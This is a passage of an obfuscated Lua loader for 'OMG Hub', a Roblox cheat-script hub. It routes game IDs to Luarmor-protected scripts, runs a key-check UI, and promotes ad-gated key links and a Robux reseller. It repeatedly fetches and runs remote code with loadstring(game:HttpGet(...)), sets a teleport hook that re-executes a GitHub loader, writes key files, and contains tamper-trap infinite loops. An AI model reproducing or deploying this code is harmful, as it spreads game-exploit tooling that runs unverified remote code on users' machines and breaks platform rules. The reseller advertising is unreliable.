							IdScript = "53bdb58db658e16638f5e7ff6d96d1d1"
						elseif game.GameId == 4069560710 then
							IdScript = "a8b9a4fd3afb0e5f810c810069b3f839"
						elseif game.GameId == 7280383417 then
							IdScript = "247179f6badeaa7b969292cc53625abf"
						elseif game.GameId == 6504986360 then
							IdScript = "689f0d5085b69f7f86748d65e4bfffd6"
						elseif game.GameId == 4161970303 then
							if not flag10 then
								return
							end
							IdScript = "2998f77310138d8a704bbf836a07318e"
						elseif game.GameId == 3756501373 then
							IdScript = v74[35]
						elseif game.GameId == v74[66] then
							IdScript = "6339bd2ba5ce61d4d6521c4cbd13a21d"
						elseif game.GameId == 7504629039 then
							IdScript = "09245824fb925bffe747769095711c7c"
						elseif game.GameId == 4724071612 then
							IdScript = "b626ab6eb4ce50abd0819333222b1614"
						elseif game.GameId == v74[67] then
							IdScript = "64e4e63833a0c96d7159bb9b2f31fa90"
						elseif game.GameId == v74[28] then
							IdScript = "ed410127750a7363b301bf4020a6fd37"
						elseif game.GameId == 5184146090 then
							IdScript = "a977bf0721a24ea17732398e76a7a66f"
						elseif game.GameId == 4509896324 then
							IdScript = "170cb99134f8a81178d3f2b6e5336110"
						elseif game.GameId == v74[51] then
							IdScript = "30ee56277adde2eec267d30354e3f479"
						elseif game.GameId == 5421640482 then
							IdScript = "187d1edb2d1b8435ff78497bbda50aa7"
						elseif game.GameId == v74[52] then
							IdScript = "1c761f00a075c21b9b9a1628f99c3369"
						elseif game.GameId == 8532043009 then
							IdScript = "694d8a2ba91957365237ec2a6eaf3258"
						elseif game.GameId == v74[10] then
							IdScript = v74[2]
						elseif game.GameId == v74[72] then
							IdScript = "7521dcb907d925cafd0491554a19f007"
						elseif game.GameId == v74[24] then
							IdScript = v74[29]

							if 2645 >= n25 then
								while v74[15] do
								end
							end
						elseif game.GameId == 7625694155 then
							IdScript = "cf2d7d38ccdadfe561b4789108f3c05e"
						elseif game.GameId == 7487899635 then
							IdScript = "12aa07169f6b238f74d21804b95d83d3"
						elseif game.GameId == 7671049560 then
							IdScript = "c88a67bb7552e649be2eb2b5431040da"
						elseif game.GameId == 6048923315 then
							IdScript = "1cb3dd033c70ae23ba16fd9b095e18dc"
						elseif game.GameId == 3808223175 then
							IdScript = "37118dfe667fda531259c9afcd5f3a5c"
						elseif game.GameId == v74[58] then
							IdScript = "03aebb85a90953b52d1eb0c667a007fd"
						elseif game.GameId == 9186719164 then
							IdScript = "7883ff51c2e1e21afd28dfeff1bb3827"
						elseif game.GameId == 9549133757 then
							local v75 = v74[68]

							if n27(4345) <= v75 then
								IdScript = v74[22]
							else
								while v74[15] do
								end
							end
						elseif game.GameId == 9266873836 then
							IdScript = "69f2d7446f9eb72d9ddd28b9c073ea8d"
						elseif game.GameId == v74[74] then
							IdScript = "5bbdcfb7a69a00431ef8cde5edfeb80a"
						elseif game.GameId == 5130394318 then
							IdScript = "2b4c1eb3637f0684dcd631b574df64ed"
						elseif game.GameId == 1522593851 then
							IdScript = "cb85ae1075b42d43ddf0207e21326ef7"
						elseif game.GameId == v74[16] then
							IdScript = "62a3725459062348dbd9521259367522"
						elseif game.GameId == v74[7] then
							if not flag10 then
								return
							end
							IdScript = v74[79]
						elseif game.GameId == 9067401541 then
							IdScript = "60e9fac77ca7141abe6c097416cf9b86"
						elseif game.GameId == v74[37] then
							IdScript = v74[73]
						elseif game.GameId == 10004244222 then
							IdScript = "551c8e9622f1f9d0642758179e6318f8"
						elseif game.GameId == 7922641102 then
							IdScript = "f0dd28fb41779cb04e3792b0809b6b64"
						elseif game.GameId == 9860860377 then
							IdScript = v74[14]
						elseif game.GameId == 66654135 then
							IdScript = v74[32]
						elseif game.GameId == v74[60] then
							IdScript = "32b83d2662aa038e977ca954c931632e"
						elseif game.GameId == 10200395747 then
							if getgenv().Mode == "Pet Finder" then
								IdScript = "79abe9abe4b8bb3318f731c1a1535c58"
							else
								IdScript = v74[47]
							end
						elseif game.GameId == 10502841145 then
							IdScript = v74[50]
						elseif game.GameId == v74[8] then
							IdScript = "f797980c516185669bf79cc980b8c133"
						elseif game.GameId == 2644656496 then
							IdScript = v74[71]
						elseif game.GameId == 9910245722 then
							IdScript = v74[34]
						elseif game.GameId == 6931042565 then
							IdScript = v74[46]
						elseif game.GameId == 1511883870 then
							IdScript = "d7d6448da1f525edf86cb5244f020b69"
						elseif game.GameId == 4658598196 then
							IdScript = v74[39]

							if _G.AutoExecute then
								queue_on_teleport("        _G.AutoExecute = true\r\n        loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua\"))()\r\n    ")
							end
						elseif game.GameId == 8718668434 then
							IdScript = "c9d3d924087d4ed7b4b1cf24da4a24cb"
						elseif game.GameId == 10563114921 then
							IdScript = v74[20]
						elseif game.GameId == 1552004129 then
							IdScript = "ec004d01ca12439179d6f75163f5e6cb"
						elseif game.GameId == 9656201728 then
							IdScript = "2a17c1c60d63936756831d9d94b44614"
						elseif game.GameId == 9880286438 then
							IdScript = "6b4135a3dba8c9781b195f19f51bb02e"
						elseif game.GameId == 5595353122 then
							IdScript = "39dfd10f0f84da534978c27597811f01"
						else
							IdScript = "139fe4838778aaf1cd50a0665e9f777f"
						end

						local v75 = IdScript
						makefolder(v74[38])
						script_key = script_key or isfile("KeySystem/Key.txt") and readfile("KeySystem/Key.txt") or nil

						local fn29 = cloneref or clonereference or function(arg)
							return arg
						end

						local v76 = fn29(game:GetService("Players"))
						fn29(game:GetService(v74[23]))

						if not (http_request or request) then
						end

						lib = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
						if not flag13 then
							return
						end
						local lib2 = loadstring(game:HttpGet("https://sdkAPI-public.luarmor.net/library.lua"))()
						lib2.script_id = v75

						fn27 = function(arg, arg2, arg3)
							lib:Notify({ Title = arg, Content = arg2, Duration = arg3 or v74[17] })
						end

						fn28 = function(arg)
							local v77 = lib2.check_key(arg or script_key)

							if v77.code == "KEY_VALID" then
								if v77.data.note ~= "Ad Reward" then
									_G.Premium = true
									print("Premium Mode: true")
									queue_on_teleport("_G.Premium = true")
									Status = "Premium"
								else
									print("Premium Mode: false")
									_G.Normal = true
								end

								script_key = arg or script_key
								writefile("KeySystem/Key.txt", script_key)
								lib:Destroy()
								lib2.load_script()
							elseif v77.code:find(v74[1]) then
								fn27("Key Check Failed", ({ KEY_HWID_LOCKED = v74[3], KEY_INCORRECT = "Key is incorrect", KEY_INVALID = v74[56] })[v77.code] or v74[69])
							else
								v76.LocalPlayer:Kick("Key check failed: " .. v77.message .. " Code: " .. v77.code)
							end

							if not (n25 <= 2644) then
								return
							end

							while true do
							end
						end
					end

					fn28()

					local v75 = lib:CreateWindow({
						Title = "OMG Hub | Key System",
						SubTitle = v74[54],
						TabWidth = 160,
						Size = UDim2.fromOffset(530, 340),
						Acrylic = false,
						Theme = v74[43],
						MinimizeKey = Enum.KeyCode.End,
					})

					local tbl18 = {
						Main = v75:AddTab({ Title = "Verify Key", Icon = "settings" }),
						GetKey = v75:AddTab({ Title = "Get Key", Icon = "user" }),
						About = v75:AddTab({ Title = v74[6], Icon = "diamond" }),
						Partner = v75:AddTab({ Title = "Partners", Icon = "star" }),
					}

					tbl18.Main:AddSection("Key Input")

					local v76 = tbl18.Main:AddInput(v74[49], {
						Title = "Enter Key:",
						Default = script_key or "",
						Placeholder = "Example: agKhRikQP..",
						Numeric = v74[62],
						Finished = v74[62],
					})

					tbl18.Main:AddButton({
						Title = "Check Key",
						Callback = function()
							fn28(v76.Value)
						end,
					})

					local TdStSqtM8p = fn26("TdStSqtM8p", v74[53])
					tbl18.About:AddSection("Discord Info")
					local v77 = tbl18.About:AddParagraph({ Title = "", Content = "" })

					spawn(function()
						while task.wait(0.1) do
							pcall(function()
								if TdStSqtM8p then
									local name = TdStSqtM8p.Name
									local description = TdStSqtM8p.Description
									local memberCount = TdStSqtM8p.MemberCount or 0
									local onlineCount = TdStSqtM8p.OnlineCount or 0
									v77:SetTitle(name .. " - " .. (TdStSqtM8p.InviteCode and "discord.gg/" .. TdStSqtM8p.InviteCode or "N/A"))
									v77:SetDesc("Member Count: " .. memberCount .. " | Online Count: " .. onlineCount .. " | " .. description)
								end
							end)
						end
					end)

					tbl18.About:AddButton({
						Title = "Copy Discord Link",
						Callback = function()
							if TdStSqtM8p then
								setclipboard(TdStSqtM8p.InviteCode and "discord.gg/" .. TdStSqtM8p.InviteCode or "N/A")
								fn27("Copied To Clipboard", "Discord Link has been copied to your clipboard", v74[64])
							end
						end,
					})

					tbl18.GetKey:AddSection("Get Key - Linkvertise")

					tbl18.GetKey:AddButton({
						Title = "Get Key Linkvertise (6 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key-AqXGNPFEWOFM")
							fn27("Copied To Clipboard", v74[4], 16)
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Linkvertise (12 hours)",
						Callback = function()
							if n28(v74[45]) <= 8780 then
								setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key3-IvqPDhamitaJ")
								fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", 16)
								return
							end

							while true do
							end
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Linkvertise (24 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key5-FFPUgHhulrnt")
							fn27("Copied To Clipboard", v74[4], 16)
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Linkvertise (48 hours)",
						Callback = function()
							local v78 = v74[5]

							if n27(2564) <= v78 then
								setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key7-CPaLpGirgfNA")
								fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", 16)
							else
								while v74[15] do
								end
							end
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Linkvertise (72 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_17-IIZImyRUxTnu")
							fn27(v74[59], "Key Link has been copied to your clipboard", v74[64])
						end,
					})

					tbl18.GetKey:AddSection("Get Key - Lootlabs")

					tbl18.GetKey:AddButton({
						Title = "Get Key Lootlabs (6 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key6-grOmJZfLZuph")
							fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", 16)
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Lootlabs (12 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_14-HdKMFzrjDJeX")
							fn27(v74[59], "Key Link has been copied to your clipboard", v74[64])
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Lootlabs (24 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_13-iXflhaHkLYGB")
							fn27(v74[59], "Key Link has been copied to your clipboard", v74[64])
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Lootlabs (48 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_15-yPvEOFMccumO")
							fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", v74[64])
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Lootlabs (72 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_16-qkLJDZtLtorO")
							if not (n25 > 2677) then
								fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", v74[64])
								return
							end

							while true do
							end
						end,
					})

					tbl18.GetKey:AddSection("Get Key - Workink")

					tbl18.GetKey:AddButton({
						Title = "Get Key Workink (6 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_9-QJAwZqPaZQhM")
							fn27("Copied To Clipboard", v74[4], 16)
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Workink (12 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key10-YdbqPgUkREbm")
							fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", 16)
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Workink (24 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_11-FUfoEcGaudIj")
							fn27("Copied To Clipboard", v74[4], 16)
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Workink (48 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_12-yLfCjeClkYcz")
							fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", 16)
						end,
					})

					tbl18.GetKey:AddButton({
						Title = "Get Key Workink (72 hours)",
						Callback = function()
							setclipboard("https://ads.luarmor.net/get_key?for=OMG_Hub_Key_18-XenNAHpefglB")
							fn27("Copied To Clipboard", "Key Link has been copied to your clipboard", 16)
						end,
					})

					tbl18.Partner:AddSection(v74[75])
					tbl18.Partner:AddParagraph({ Title = "# Best Farming AFK Ugphone - No Crash/Smoother", Content = "" })

					tbl18.Partner:AddButton({
						Title = "Click For Free 488 diamonds",
						Callback = function()
							setclipboard("https://www.ugphone.com/toc-page/promotion/#/r?partner_id=63c02520-5a19-76c9-eceb-2ad257cf7b0f&invitation_code=omghub")
							fn27("Copied To Clipboard", "Diamonds Link has been copied to your clipboard", v74[64])
						end,
					})

					tbl18.Partner:AddSection(v74[65])

					tbl18.Partner:AddParagraph({
						Title = "# Dabux | Robux Store",
						Content = [[🚀 Looking for a trusted place to buy Robux? You've found it.

At Dabux, we provide clean Robux through Gamepass and Group Payouts, ensuring a safe and professional experience from start to finish.

━━━━━━━━━━━━━━━━━━━━━━

💰 OUR PRICE

🔥 Only $8.99 per 1,000 Robux!

📦 Examples:
• 1,000 Robux — $8.99
• 5,000 Robux — $44.95
• 10,000 Robux — $89.90
• 25,000 Robux — $224.75

━━━━━━━━━━━━━━━━━━━━━━

✅ Clean Robux
✅ Delivery via Gamepass
✅ Delivery via Group Payout
✅ Fast & Professional Support
✅ Secure Transactions
✅ Trusted Service
✅ Quick Order Processing

━━━━━━━━━━━━━━━━━━━━━━

🎮 Perfect for:
🛒 Gamepasses
👕 Avatar Items
⚔️ In-Game Purchases
💎 Limited Items
🎁 Gifts for Friends
🚀 Upgrading Your Roblox Experience

━━━━━━━━━━━━━━━━━━━━━━

📦 How to Order
1️⃣ Open a ticket
2️⃣ Tell us how much Robux you need
3️⃣ Choose delivery method
4️⃣ Complete payment
5️⃣ Receive your Robux

━━━━━━━━━━━━━━━━━━━━━━

⚠️ Important Information
• We only sell clean Robux
• Stock may be limited
• Prices may change
• Large orders welcome

━━━━━━━━━━━━━━━━━━━━━━

🔥 Thousands of Robux waiting for you!

💙 DABUX — Fast, Safe & Affordable Robux.]],
					})

					tbl18.Partner:AddButton({
						Title = "Copy Discord Link",
						Callback = function()
							setclipboard("https://discord.gg/k32cDCAA5")
							fn27(v74[59], "Discord Link has been copied to your clipboard", 16)
						end,
					})

					fn27("OMG Hub Key System", "Key System Loaded!", 5)
					v75:SelectTab(1)
					return
				end

				while true do
				end
			end
		end
	end
end

fn11(100, v3[fn2("q\20@L0ڄ\183\234\138x", 8628852629348)], v3[fn2("\143\16\31\171\151\220\251\165P5\6\14\235\140z:\215\207}Y\0\153\6):\240\t\185\189\253\212J\225\23Y\173\138", 22957300798340)] .. v31(v55), Color3[v3[fn2("&\140c", 34647484792331)]](1, 0, 0), v3[fn2("\240\140\232\29\183", 24582995532142)])
